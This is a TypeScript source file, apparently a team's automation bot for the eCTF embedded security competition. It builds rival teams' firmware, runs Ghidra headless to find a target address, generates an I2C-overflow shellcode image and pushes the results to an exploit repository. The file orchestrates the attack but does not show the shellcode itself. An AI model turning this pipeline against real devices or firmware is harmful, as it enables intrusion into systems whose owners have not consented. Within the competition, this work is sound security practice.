import { exec as execN, execSync } from "child_process"
import { readFileSync } from "fs"
import { promisify } from "util"
import { EXPLOIT_REPO_URL } from '../auth'
import { updateAttackStatus } from "../bot"

const exec = promisify(execN);

type AddressMatches = {
    exactMatch: string | null
    otherMatches: Record<string, string>
}

type AttackStep = {
    name: string
    detail?: string
    startTime?: number
    runTime?: number
}

export type AttackState = {
    messageId?: string
    team: string
    steps: AttackStep[]
    currentStep: number
    status: 'SUCCESS' | 'PENDING' | 'FAILED',
}

export const ATTACK_STEPS: AttackStep[] = [
    { name: "Build target components" },
    { name: "Find RECV_DONE_ADDR" },
    { name: "Build exploit" },
    { name: "Upload to slack" },
    { name: "Get flag" },
];

let lastQueue: NodeJS.Timeout;

function queueStatueUpdate(state: AttackState) {
    clearTimeout(lastQueue);
    lastQueue = setTimeout(() => {
        updateAttackStatus(state)
    }, 3000);
}

export async function supplyChain(team: string) {
    const state: AttackState = {
        team,
        status: 'PENDING',
        currentStep: 0,
        steps: structuredClone(ATTACK_STEPS)
    };
    queueStatueUpdate(state);
    console.log(`[SUPPLY] Running attack on ${team}...`);

    await buildComponents(state);

    const selectedAddr = await getRecvDoneAddr(state);

    await buildSupplyExploit(state, selectedAddr);

}

async function buildComponents(state: AttackState) {
    console.log(`[SUPPLY] Building ${state.team} AP...`);
    state.steps[0].startTime = Date.now();
    state.steps[0].detail = `Building ${state.team} AP...`;
    queueStatueUpdate(state);
    try {
        await exec(
            `cd ""./targets/${state.team}/src"" && cached-nix-shell -v --run "poetry install && poetry run python ectf_tools/build_ap.py -d . -on ap -p 123456 -t 6969696969ababab -c 2 -ids '0x11111125, 0x11111126' -b wasup"`,
        );
    } catch (e) {
        console.error("[SUPPLY] Failed to build AP!");
        state.steps[0].detail = `Failed to build AP!`;
        state.steps[0].runTime = Date.now() - state.steps[0].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }


    console.log(`[SUPPLY] Building ${state.team} Component...`);
    state.steps[0].detail = `Building ${state.team} Component...`;
    queueStatueUpdate(state);
    try {
        await exec(
            `cd ""./targets/${state.team}/src"" && cached-nix-shell -v --run "poetry run python ectf_tools/build_comp.py -d . -on comp -id 0x11111125 -b 'component a' -al 'detroit' -ad '1/1/2069' -ac 'bobs warehouse'"`,
        );
    } catch (e) {
        console.error("[SUPPLY] Failed to build Component!");
        state.steps[0].detail = `Failed to build Component!`;
        state.steps[0].runTime = Date.now() - state.steps[0].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }

    state.steps[0].detail = `Uploading to GitHub...`;
    queueStatueUpdate(state);
    try {
        await exec("cd exploit && git reset origin --hard");

        await exec(
            `mkdir -p ""./exploit/${state.team}""`
        );
        await exec(
            `mv ""./targets/${state.team}/src/ap.elf"" ""./exploit/${state.team}/ap.elf""`
        );
        await exec(
            `mv ""./targets/${state.team}/src/comp.elf"" ""./exploit/${state.team}/comp.elf""`
        );

        await exec(
            `cd exploit && git add . && git -c user.name="eCTF scrape bot" -c user.email="purdue@ectf.fake" commit -m "Build components for ${state.team}" && git push
        `);
    } catch (e) {
        console.error("[SUPPLY] Failed to upload to GitHub!");
        state.steps[0].detail = `Failed to upload to GitHub!`;
        state.steps[0].runTime = Date.now() - state.steps[0].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }

    state.steps[0].detail = "";
    state.steps[0].runTime = Date.now() - state.steps[0].startTime;
    queueStatueUpdate(state);
}

async function getRecvDoneAddr(state: AttackState) {
    console.log(`[SUPPLY] Running Ghidra for ${state.team}...`);
    state.currentStep = 1;
    state.steps[1].startTime = Date.now();
    queueStatueUpdate(state);
    try {
        const {stdout} = await exec(
            `ghidra_11.0.2_PUBLIC/support/analyzeHeadless ghidra_proj ${state.team}_${Date.now()} -import ""./exploit/${state.team}/comp.elf"" -postScript ghidra.py`,
        );
        const results: AddressMatches = {
            exactMatch: null,
            otherMatches: {}
        };
        for (const match of stdout.matchAll(/FOUND_ADDR(_EXACT|\[.+\]): ([\dxabcdef]+)/g)) {
            if (match[1] == "_EXACT") {
                results.exactMatch = match[2];
            } else {
                results.otherMatches[match[1].substring(1, -1)] = match[2];
            }
        };
        if (results.exactMatch) {
            state.steps[1].detail = `Found exact match at \`0x${results.exactMatch}\``;
        } else if (Object.values(results.otherMatches).length > 0) {
            state.steps[1].detail = "No exact match, found" +
                Object.entries(results.otherMatches)
                    .map(([name, addr]) => `${name}: \`0x${addr}\``)
                    .join(", ");
        } else {
            console.log(`[SUPPLY] No matches found!`);
            state.steps[1].detail = "No matches found!";
            state.steps[1].runTime = Date.now() - state.steps[1].startTime;
            state.status = "FAILED";
            queueStatueUpdate(state);
            throw new Error("No matches found for RECV_DONE_REG!");
        }
        console.log(`[SUPPLY] Found addresses: ${JSON.stringify(results)}`);
        let selectedAddr = null;
        if (results.exactMatch != null) {
            selectedAddr = results.exactMatch;
        } else {
            // choose the first one lol
            selectedAddr = Object.values(results.otherMatches)[0];
        }

        state.steps[1].runTime = Date.now() - state.steps[1].startTime;
        queueStatueUpdate(state);
        return selectedAddr;
    } catch (e) {
        console.error("[SUPPLY] Failed to run Ghidra!");
        state.steps[1].runTime = Date.now() - state.steps[1].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }
}

async function buildSupplyExploit(state: AttackState, addr: string) {
    console.log(`[SUPPLY] Building malicious supply chain comp for ${state.team}`);
    state.currentStep = 2;
    state.steps[2].startTime = Date.now();
    queueStatueUpdate(state);

    // Get component ids
    let ids;
    try {
        ids = JSON.parse(readFileSync(`targets/${state.team}/firmware/Supply_Chain/ids.json`, {encoding: "utf-8"}));
    } catch (e) {
        console.error("[SUPPLY] Couldn't read component ids!");
        state.steps[2].detail = "Couldn't read component ids!";
        state.steps[2].runTime = Date.now() - state.steps[2].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }

    state.steps[2].detail = `Building attack...`;
    queueStatueUpdate(state);

    try {
        await exec(`
            cd exploit/i2c_overflow/i2c_supply_chain && cached-nix-shell -v --run "poetry install && ./make_secrets.sh && poetry run python supply_chain_shellcode.py -o out -c ${ids.comp0_id} -r 0x${addr}"
        `);
    } catch (e) {
        console.error("[SUPPLY] Couldn't build attack!");
        state.steps[2].detail = "Couldn't build attack!";
        state.steps[2].runTime = Date.now() - state.steps[2].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }

    state.steps[2].detail = `Uploading to GitHub...`
    queueStatueUpdate(state);

    try {
        await exec("cd exploit && git reset origin --hard");
        await exec(`mv exploit/i2c_overflow/i2c_supply_chain/out.img ""exploit/${state.team}/${state.team}_i2c_dumper.img""`);
        await exec("rm exploit/i2c_overflow/i2c_supply_chain/out.*");
        await exec(
            `cd exploit && git add . && git -c user.name="eCTF scrape bot" -c user.email="purdue@ectf.fake" commit -m "Build attack for ${state.team}" && git push
        `);
    } catch (e) {
        console.error("[SUPPLY] Couldn't upload attack to GitHub!");
        state.steps[2].detail = "Couldn't upload attack to GitHub!";
        state.steps[2].runTime = Date.now() - state.steps[2].startTime;
        state.status = 'FAILED';
        queueStatueUpdate(state);
        throw e;
    }

    state.currentStep = 3;
    state.steps[2].detail = "";
    state.steps[2].runTime = Date.now() - state.steps[2].startTime;
    queueStatueUpdate(state);
}

export async function initExploitsRepo() {
    console.log('[GIT] Initializing exploits repository');
    execSync(`git clone ${EXPLOIT_REPO_URL} exploit || (cd exploit && git reset origin --hard)`);
    console.log(execSync('cd exploit && git status').toString());
}

// ;(async () => {
//     await initExploitsRepo()
//     supplyChain("SMCAA")
// })();
